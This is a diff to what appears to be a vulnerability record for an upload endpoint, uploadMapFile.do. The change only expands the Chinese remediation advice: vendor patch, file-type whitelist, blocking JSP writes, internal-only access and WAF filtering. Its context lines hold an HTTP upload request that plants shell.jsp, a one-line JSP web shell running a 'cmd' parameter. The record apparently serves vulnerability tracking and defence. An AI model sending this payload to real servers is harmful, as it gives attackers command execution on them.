@@ -9,7 +9,7 @@ detail = """POST /manage/visitorMapConfig/uploadMapFile.do HTTP/1.1 Host: target
 Content-Disposition: form-data; name="file"; filename="shell.jsp"
 <% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
 ------Boundary--"""
-fix = "联系厂商获取补丁"
+fix = "联系汉王厂商获取 TVD-2026-XXXXX 安全补丁；对 uploadMapFile.do 添加文件类型白名单校验；JSP 目录禁止写入文件；限制该接口仅允许内网访问；WAF 拦截文件上传中的恶意脚本内容。"
 date = 20250701
 label = "nday"
 cve = "TVD-2026-XXXXX"
